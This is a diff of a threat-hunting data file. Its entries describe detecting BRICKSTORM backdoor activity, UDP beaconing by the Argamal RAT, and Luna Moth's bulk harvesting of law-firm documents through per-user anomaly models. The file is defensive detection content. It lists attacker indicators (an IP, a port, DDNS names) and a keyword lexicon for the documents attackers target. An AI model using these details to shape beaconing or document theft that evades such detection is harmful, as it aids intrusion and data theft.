+    "references": "- [MITRE ATT&CK T1071.001 - Application Layer Protocol: Web Protocols](https://attack.mitre.org/techniques/T1071/001/)\n- [Volexity - VerdantBamboo: Just Another BRICKSTORM in the Firewall (source report)](https://www.volexity.com/blog/2026/06/04/verdantbamboo-just-another-brickstorm-in-the-firewall/)\n- [Mandiant / Google Cloud - Another BRICKSTORM: Stealthy Backdoor Enabling Espionage into Tech and Legal Sectors](https://cloud.google.com/blog/topics/threat-intelligence/brickstorm-espionage-campaign)\n- [CISA - BRICKSTORM Backdoor analysis report (AR25-338A)](https://www.cisa.gov/news-events/analysis-reports/ar25-338a)\n- [MITRE ATT&CK T1071.004 - Application Layer Protocol: DNS (DNS-over-HTTPS context)](https://attack.mitre.org/techniques/T1071/004/)\n- [CISA - Guidance and strategies to protect network edge devices](https://www.cisa.gov/resources-tools/resources/guidance-and-strategies-protect-network-edge-devices)\n- [NVISO Labs - BRICKSTORM backdoor analysis report](https://blog.nviso.eu/wp-content/uploads/2025/04/NVISO-BRICKSTORM-Report.pdf)",
+    "file_path": "Flames/H185.md"
+  },
+  {
     "id": "M001",
     "category": "Alchemy",
     "title": "A machine learning model can detect anomalies in user login patterns that indicate compromised accounts.",
@@ -6045,5 +6274,36 @@ const HUNTS_DATA = [
     "why": "- UDP heartbeat beaconing is invisible to most C2 detection, which is tuned for HTTP/S and DNS — a small datagram to a high UDP port every N seconds generates no proxy log, no TLS SNI, and no DNS query if the IP is hardcoded. Modeling the *timing and shape* of the flow rather than its content is the only way to catch a heartbeat that carries no application-layer protocol to inspect, which is exactly why Argamal chose UDP/57441 for its beacon\n- Static indicators decay immediately: port 57441, the `186.158.223.35` IP, and the `freeddns`/`kozow`/`ignorelist` DDNS names will all rotate. The behavioral features — low interval coefficient of variation, near-uniform tiny payloads, a long-lived low-byte flow to a rare external destination — are intrinsic to beaconing and survive that rotation, so a model trained on shape generalizes to the next Argamal variant and to unrelated RATs that heartbeat the same way\n- A static threshold (\"> N UDP packets to a high port\") fails in both directions: it floods on legitimate periodic UDP (NTP, telemetry, VoIP, game netcode) and misses a slow beacon paced to blend in. Scoring each host against its own 30-day baseline of normal periodic traffic — then allowlisting the known-good periodics — is what separates a C2 heartbeat from the genuinely large volume of benign regular UDP on a real network\n- The beacon is often the only network-visible artifact of an endpoint compromise whose on-host stages (signed-looking DLL side-load, COM-hijack persistence — see [[H178]], [[H177]]) were quiet. Catching the periodic outbound flow gives a second, independent detection plane: even if the host-based hunts miss the implant, the metronomic UDP to a rare destination is a durable, model-detectable tell that something is calling home",
     "references": "- [MITRE ATT&CK T1095 - Non-Application Layer Protocol](https://attack.mitre.org/techniques/T1095/)\n- [MITRE ATT&CK T1571 - Non-Standard Port](https://attack.mitre.org/techniques/T1571/)\n- [Securelist (Kaspersky) - Argamal: Malware hidden in hentai games](https://securelist.com/argamal-rat-distributed-with-hentai-games/119999/)\n- [Active Countermeasures - RITA: Detecting beacons with interval and jitter analysis](https://www.activecountermeasures.com/free-tools/rita/)\n- [Elastic Security - Beaconing detection with statistical and ML methods](https://www.elastic.co/security-labs/identifying-beaconing-malware-using-elastic)\n- [Zeek - conn.log fields for network beacon hunting](https://docs.zeek.org/en/master/logs/conn.html)\n- [Splunk - Detecting C2 beaconing over UDP with timing and volume analytics](https://www.splunk.com/en_us/blog/security/threat-hunting-for-beacons.html)",
     "file_path": "Alchemy/M017.md"
+  },
+  {
+    "id": "M018",
+    "category": "Alchemy",
+    "title": "A per-identity volumetric/behavioral model over file-and-directory access can surface UNC3753 (Luna Moth) bulk document harvesting — a single user account, shortly after RMM/remote access is established, fanning out across local directories, OneDrive, mapped network drives, and the iManage document store and touching far more files/folders (and far more sensitive-keyword documents — W-2, W-9, 1099, audit, SSN, client agreements) than that identity's own 30-day baseline — rather than relying on a static threshold that admins and power users trip constantly.",
+    "tactic": "Discovery",
+    "notes": "Platform: Windows / M365 (endpoint + document-store + cloud telemetry; the model is data-source-agnostic). Driven by Mandiant/GTIG \"Seeking Counsel: Ongoing Targeted Campaign Against US Law Firms\" (UNC3753 / Luna Moth / Silent Ransom Group, June 5, 2026), which described operators who, once hands-on, \"map local directories, enumerate active OneDrive folders, crawl mapped network drives\" and run keyword searches across iManage for tax forms (W-2, W-9, 1099), audit files, corporate client agreements, and SSNs before staging multi-GB exfil. **Why rules alone fail**: File and Directory Discovery (T1083) is something admins, lawyers, and indexing services do all day, so a static \"N file accesses\" rule either floods or misses; the malicious signal is *deviation from each identity own normal breadth and rate*, which only a per-user baseline captures. **Data sources**: Windows Security **Event ID 4663** (object access on files / shares) and **5145** (network share object access) with Audit Object Access / Detailed File Share enabled; Sysmon **Event ID 11** (FileCreate) for local staging; MDE `DeviceFileEvents`; M365 / Office Suite Unified Audit Log `FileAccessed`, `FileDownloaded`, `SearchQueryPerformed`, and OneDrive/SharePoint access events; iManage audit/work-history logs (open, export, search). **Feature engineering** (per user x rolling 1h/24h window vs 30-day baseline): (1) `distinct_dirs_touched` and `distinct_shares_touched`; (2) `files_accessed_rate` (files/min); (3) `sensitive_keyword_hits` = count of accessed/searched items matching a lexicon (W-2, W-9, 1099, K-1, audit, SSN, \"client agreement\", \"engagement letter\"); (4) `breadth_z` = z-score of directories touched vs this user own mean/stddev; (5) `new_repo_access` = first-ever access by this identity to a given share/iManage workspace; (6) `post_rmm_proximity` = time since an RMM/remote-access logon on the same host (ties the burst to [[H181]]/[[H182]]). **Model approach**: per-user robust z-score / median-absolute-deviation on breadth+rate, layered with an Isolation Forest over the feature vector, after subtracting known bulk actors (backup/indexing/eDiscovery service accounts) via an allowlist. **Fire conditions**: alert when `breadth_z` > 3 AND `sensitive_keyword_hits` elevated AND `new_repo_access` = true — OR Isolation-Forest score past the 99th percentile within an hour of an RMM logon. **Tuning**: maintain an allowlist of legitimate bulk-access identities (DMS indexers, backup, eDiscovery, paralegal mass-export workflows) and score deviation from each identity own normal. Cross-ref **T1005** (Data from Local System), **T1213** (Data from Information Repositories / iManage), **T1135** (Network Share Discovery); the staging that follows feeds cloud exfil (T1567.002) and USB exfil ([[H183]]).",
+    "tags": [
+      "discovery",
+      "windows",
+      "m365",
+      "imanage",
+      "data_collection",
+      "anomaly_detection",
+      "model_assisted",
+      "luna_moth",
+      "T1083"
+    ],
+    "techniques": [
+      "T1083"
+    ],
+    "severity": null,
+    "status": "current",
+    "related_hunt_ids": [],
+    "submitter": {
+      "name": "Lauren Proehl",
+      "link": "https://x.com/jotunvillur"
+    },
+    "why": "- File and Directory Discovery is the textbook example of a technique that is unhuntable with a static rule — every knowledge worker and every indexing service enumerates files constantly — so the only way to make Luna Moth's harvesting visible is to model each identity against its own normal breadth and rate and alert on the deviation, which is squarely a model-assisted (Alchemy) problem, not a signature one.\n- The malicious burst has a distinctive *shape* even when each individual access looks benign: a single account suddenly touching many more directories, more shares, and far more sensitive-keyword documents than it ever has, often within minutes of an RMM logon. That multi-feature anomaly is detectable precisely because it departs from a stable per-user baseline that legitimate work rarely violates.\n- Anchoring on behavior rather than indicators makes the detection durable: Luna Moth rotates infrastructure, RMM tools, and personas, but the data-theft business model *requires* a wide, fast crawl for valuable documents — so a model trained on enumeration breadth/rate and sensitive-keyword density generalizes across campaigns and even to unrelated insider/extortion actors.\n- This hunt is the connective tissue between the access hunts and the exfil hunts: it fires in the window after [[H181]]/[[H182]] establish access but before the cloud/USB exfil ([[H183]]) completes, giving responders their best chance to intervene while the data is being staged rather than after it has left.",
+    "references": "- [MITRE ATT&CK T1083 - File and Directory Discovery](https://attack.mitre.org/techniques/T1083/)\n- [Mandiant / GTIG - Seeking Counsel: Ongoing Targeted Campaign Against US Law Firms (source report)](https://cloud.google.com/blog/topics/threat-intelligence/targeted-campaign-us-law-firms/)\n- [MITRE ATT&CK T1213 - Data from Information Repositories](https://attack.mitre.org/techniques/T1213/)\n- [Microsoft Learn - Search the audit log (FileAccessed / SearchQueryPerformed / FileDownloaded)](https://learn.microsoft.com/en-us/purview/audit-log-activities)\n- [Elastic Security Labs - Anomaly detection and behavioral baselining for data access](https://www.elastic.co/security-labs/)\n- [Varonis - Detecting abnormal data access and insider data theft](https://www.varonis.com/blog/data-exfiltration)\n- [Unit 42 - Threat Assessment: Luna Moth Callback Phishing Campaign](https://unit42.paloaltonetworks.com/luna-moth-callback-phishing/)",
+    "file_path": "Alchemy/M018.md"
   }
 ];
